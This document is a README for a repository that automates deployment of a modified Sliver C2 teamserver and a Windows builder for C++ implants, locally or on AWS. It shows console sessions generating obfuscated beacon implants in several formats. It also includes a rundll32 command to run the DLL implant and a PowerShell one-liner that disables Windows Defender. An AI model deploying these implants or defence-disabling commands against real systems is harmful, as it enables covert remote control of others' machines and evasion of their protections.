# sliver-deployment

This repo contains automation scripts in order to deploy my own branch (**branch refactor/teamserver-interaction**) of sliver having P2P communications over beacons, along with a builder (**branch cppimplant**) able to build C++ sliver implants for windows platform. Source code of C++ implant is available here: https://github.com/MrAle98/Sliver-CPPImplant2. The implant code is compatible only with the branch **refactor/teamserver-interaction** as It changes the way the implant interacts with the server in order to support P2P communications over beacons.

This repository deploys both a **sliver teamserver** and a **builder of C++ implants for the windows machine**. The **teamserver** is deployed on **linux machine**, the **builder** is deployed on a **windows machine**.

## Requirements

Requires to install locally:
* **ansible**
* [**pywinrm**](https://docs.ansible.com/ansible/latest/os_guide/windows_winrm.html) so that ansible con communicate with the windows VM over WinRM
* [**go1.19.1**](https://go.dev/dl/)

Additional requirements to install on aws:
* **terraform** 
* **awscli**


Be sure that when you run go on your machine the symbolic link is pointing to go1.19.1.
```
┌──(kali㉿kali)-[/usr/bin]
└─$ ls -la go
lrwxrwxrwx 1 root root 26 13 ago 16.19 go -> /home/kali/go/bin/go1.19.1

┌──(kali㉿kali)-[/usr/bin]
└─$
```

## Deploy all locally

Here instructions about how to deploy the **teamserver** on a **local kali VM** and the **builder** on a **local windows VM**.

Clone repo with all submodules on kali VM.
```
git clone --recursive https://github.com/MrAle98/sliver-deployment.git
```

Disable AV on windows VM.

Copy setup_local.ps1 on windows VM. Change username and password variable inside the script to be whatever you like. Default are `ansibleUser:ansiblePass`. Run the script (as administrator).

```
PS > powershell -ep bypass
PS > .\setup_local.ps1
[...]
You need to restart this machine prior to using choco.
Ensuring Chocolatey commands are on the path
Ensuring chocolatey.nupkg is in the lib folder
PS >
```

Restart the VM. After the VM restarts **be sure AV is completely disabled**.

Run build-servers.sh.

```
./build-servers.sh
```

You should find artifacts under `~/sliver-builds` and `./ansible_configs/sliver`.

Update ./ansible_configs/inventory/win_inventory.yml with ip of your windows VM and username and password you set before.
```
[sliverbuilder]
192.168.119.132

[sliverbuilder:vars]
ansible_connection=winrm
ansible_user=ansibleUser
ansible_password=ansiblePass
ansible_winrm_server_cert_validation=ignore
```

Start sliver-server locally. Start multiplayer mode and create two operators: one is the builder the other one a normal operator.
```
$ ~/sliver-builds/sliver-server
[*] Loaded 16 aliases from disk
[*] Loaded 69 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain cipher
[*] Server v1.5.22 - 1230ffeda7ec994d56e1ed0036b00b50508ca7d8
[*] Welcome to the sliver shell, please type 'help' for options

[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver > new-operator -l 192.168.161.50 -n winbuilder

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/kali/sliver-builds/winbuilder_192.168.161.50.cfg

[server] sliver > new-operator -n ale98 -l 127.0.0.1

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/kali/sliver-builds/ale98_127.0.0.1.cfg

[*] ale98 has joined the game

[server] sliver > operators

 Name         Status
============ =========
 winbuilder   Offline
 ale98        Offline

[server] sliver >
```

Move winbuilder_192.168.161.50.cfg under ansible_configs/sliver with name builder.cfg
```
mv winbuilder_192.168.161.50.cfg /path/to/ansible_configs/sliver/builder.cfg
```

Run ansible playbook win-playbook.yml (It will take 1 hour or more). 
```
cd ansible_configs/
ansible-playbook -i inventory/win_inventory.yml win-playbook.yml
```

Now start a sliver-client on your kali machine and notice the builder was registered successfully and you can generate exe, dll, dotnet, powershell implants. Be careful to spawn HTTP/HTTPS listeners always with the `-D` option as the C++ implant do not provide full support for OTPs.

```
sliver > http -D
[...]
sliver > generate beacon --http http://192.168.161.50 -E -f dotnet

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
 ⠹  External build acknowledged by builder (template: sliver) ... 1m32s
sliver > builders

 Name              Operator     Templates   Platform        Compiler Targets
================= ============ =========== =============== ==========================
 DESKTOP-H8C0U5U   winbuilder   sliver      windows/amd64   EXECUTABLE:windows/amd64
                                                            DOTNET:windows/amd64
                                                            POWERSHELL:windows/amd64
                                                            SHARED_LIB:windows/amd64
                                                            SERVICE:windows/386
                                                            SERVICE:windows/amd64
                                                            SHELLCODE:windows/386
                                                            SHELLCODE:windows/amd64

sliver > generate beacon --http http://192.168.161.50 -E -f dotnet

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 2m1s
[*] Build name: PRACTICAL_PIANO (9650688 bytes)
[*] Implant saved to /home/kali/sliver-builds/a.exe

sliver > generate beacon --http http://192.168.161.50 -E -f powershell

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 1m38s
[*] Build name: OPTIMISTIC_LAUNDRY (12872831 bytes)
[*] Implant saved to /home/kali/sliver-builds/a.ps1

sliver > generate beacon --http http://192.168.161.50 -E -f exe

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 1m18s
[*] Build name: STRAIGHT_DEPLOYMENT (3352576 bytes)
[*] Implant saved to /home/kali/sliver-builds/STRAIGHT_DEPLOYMENT.exe

sliver > generate beacon --http http://192.168.161.50 -E -f shared

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 1m16s
[*] Build name: LEGAL_LENGTH (3431424 bytes)
[*] Implant saved to /home/kali/sliver-builds/LEGAL_LENGTH.dll

sliver >
```

Dll entrypoint is **Entry**.

```
rundll32.exe LEGAL_LENGTH.dll,Entry
```

## Deploy all on aws

Here instructions for deploying the **teamserver** on a **amazon linux VM** and the **builder** on a **windows VM** both hosted on **AWS**.

**Create ssh key on AWS** and take note of a **subnet id** of your **default VPC**. In addition take note of the **ip address range** of your subnet. 

Clone repo with all submodules on kali VM.
```
git clone --recursive https://github.com/MrAle98/sliver-awsdeployment.git
```

Change the following properties in terraform files:
* `variables.tf` - `private_key`: name of SSH key created on AWS.
* `variables.tf` - `whitelist_cidr_home`: CIDR of ips allowed to reach the machines hosted on AWS (home).
* `variables.tf` - `whitelist_cidr_office`: CIDR of ips allowed to reach the machines hosted on AWS (office).
* `variables.tf` - `subnet_id`: subnet of internal subnet of your default VPC.
* `variables.tf` - `private_ip_sliver-server`: ip address part of the subnet_id CIDR. Set the same ip address in `ansible_configs/linux-playbook.yml` in place of 172.31.0.5 (in case are not matching).
* `variables.tf` - `instance_username`: winRM username for accessing windows VM on aws. Set the same on `ansible_configs/inventory/win_inventory.yml`.
* `variables.tf` - `instance_password`: winRM password for accessing windows VM on aws. Set the same on `ansible_configs/inventory/win_inventory.yml`.

In addition remember to:
* change **path to private key** (.pem file) in `decrypt_pass.sh`.
* change **path to private key** (.pem file) in `ansible_configs/run_linuxplaybook.sh`.
  



Run terraform.
```
$ terraform init
$ terraform validate
$ terraform apply
[...]
Outputs:

Administrator_Password = "[base64]"
sliver-server_ip = "3.77.146.66"
windows-sliver-builder_ip = "3.68.68.55"
$ 
```

Decrypt Administrator_Password (in case you need it).
```
$ ./decrypt_pass.sh <base64 Administrator_Password>
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
[your password] 
$
```

Disable Windows defender.

```
$ evil-winrm -i 18.197.48.244 -u <username in variables.tf> -p <password in variables.tf> -P 5986 -S
                                        
[...]

*Evil-WinRM* PS C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
*Evil-WinRM* PS C:\> 
```


Update ./ansible_configs/inventory/win_inventory.yml with ip of the windows VM on AWS (windows-sliver-builder_ip).
```
[sliverbuilder]
3.68.68.55

[sliverbuilder:vars]
ansible_connection=winrm
ansible_user=<username in variables.tf>
ansible_password="<password in variables.tf>"
ansible_winrm_server_cert_validation=ignore
```

Run run-linuxplaybook.sh passing as input linux VM ip hosted on aws (sliver-server_ip).
```
$ cd ansible_configs
$ ./run-linuxplaybook.sh 3.77.146.66
[...]
changed: [3.77.146.66]
 ____________
< PLAY RECAP >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

3.77.146.66                : ok=17   changed=15   unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
$
```


Copy builder_aws.cfg under ansible_configs/sliver.

```
cp builder_aws.cfg sliver/builder.cfg
```

Run ansible playbook win-playbook.yml (takes 1 hour or more).

```
ansible-playbook -i inventory/win_inventory.yml win-playbook.yml
```

Import operator.cfg in sliver-client.

```
~/sliver-builds/sliver-client import operator.cfg
```

Start sliver-client selecting the proper operator.cfg and you should be ready to generate artifacts.
```
$ ~/sliver-builds/sliver-client                                  
? Select a server: operator@3.77.146.66 (265eec1987734c67)
Connecting to 3.77.146.66:31337 ...
[*] Loaded 16 aliases from disk
[*] Loaded 69 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain miracle
[*] Server v1.5.22 - 1230ffeda7ec994d56e1ed0036b00b50508ca7d8
[*] Welcome to the sliver shell, please type 'help' for options

sliver > builders

 Name              Operator      Templates   Platform        Compiler Targets         
================= ============= =========== =============== ==========================
 EC2AMAZ-DDP1C9Q   builder_aws   sliver      windows/amd64   EXECUTABLE:windows/amd64 
                                                             DOTNET:windows/amd64     
                                                             POWERSHELL:windows/amd64 
                                                             SHARED_LIB:windows/amd64 
                                                             SERVICE:windows/386      
                                                             SERVICE:windows/amd64    
                                                             SHELLCODE:windows/386    
                                                             SHELLCODE:windows/amd64  

sliver >  
```

## Deploy teamserver on aws and builder on local machine

Here instructions for deploying the **teamserver** on a **amazon linux VM**, hosted on **AWS**, and the **builder** on a **local windows VM**.

**Create ssh key on AWS** and take note of a **subnet id** of your **default VPC**. In addition take note of the **ip address range** of your subnet. 

Clone repo with all submodules on kali VM and change current branch to **builder-local-deploy**.
```
git clone --recursive https://github.com/MrAle98/sliver-awsdeployment.git
git checkout builder-local-deploy
```

Change the following properties in terraform files:
* `variables.tf` - `private_key`: name of SSH key created on AWS.
* `variables.tf` - `whitelist_cidr_home`: CIDR of ips allowed to reach the machines hosted on AWS (home).
* `variables.tf` - `whitelist_cidr_office`: CIDR of ips allowed to reach the machines hosted on AWS (office).
* `variables.tf` - `subnet_id`: subnet of internal subnet of your default VPC.
* `variables.tf` - `private_ip_sliver-server`: ip address part of the subnet_id CIDR. Set the same ip address in `ansible_configs/linux-playbook.yml` in place of 172.31.0.5 (in case are not matching).


In addition remember to:
* change **path to private key** (.pem file) in `ansible_configs/run_linuxplaybook.sh`.

Disable AV on windows VM.

Copy setup_local.ps1 on windows VM. Change username and password variable inside the script to be whatever you like. Default are `ansibleUser:ansiblePass`. Run the script (as administrator).

```
PS > powershell -ep bypass
PS > .\setup_local.ps1
[...]
You need to restart this machine prior to using choco.
Ensuring Chocolatey commands are on the path
Ensuring chocolatey.nupkg is in the lib folder
PS >
```

Restart the VM. After the VM restarts **be sure AV is completely disabled**.

Run build-servers.sh.

```
./build-servers.sh
```

Update ./ansible_configs/inventory/win_inventory.yml with ip of your windows VM and username and password you set before.
```
[sliverbuilder]
192.168.119.132

[sliverbuilder:vars]
ansible_connection=winrm
ansible_user=ansibleUser
ansible_password=ansiblePass
ansible_winrm_server_cert_validation=ignore
```

Run terraform.
```
terraform init
terraform validate
terraform apply
```

Run run-linuxplaybook.sh passing as input linux VM ip hosted on aws (sliver-server_ip).
```
$ cd ansible_configs
$ ./run-linuxplaybook.sh <sliver-server_ip>
[...]
 ____________
< PLAY RECAP >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

               : ok=17   changed=15   unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
$
```

Copy builder_local.cfg under ansible_configs/sliver.

```
cp builder_local.cfg sliver/builder.cfg
```

Run ansible playbook win-playbook.yml (takes 1 hour or more).

```
ansible-playbook -i inventory/win_inventory.yml win-playbook.yml
```

Import operator.cfg in sliver-client.

```
~/sliver-builds/sliver-client import operator.cfg
```

Start sliver-client selecting the proper operator.cfg and you should be ready to generate artifacts.





## Notes

powershell and dotnet formats rely on inceptor and MemoryModulePP projects.

## Acknowledgements

* [Alessandro Magnosi](https://twitter.com/KlezVirus) for inceptor
* [@bb107](https://github.com/bb107) for MemoryModulePP
* [Joe DeMesy](https://github.com/moloch--) [Ronan Kervella](https://github.com/rkervella) [BishopFox](https://github.com/BishopFox) for sliver of course
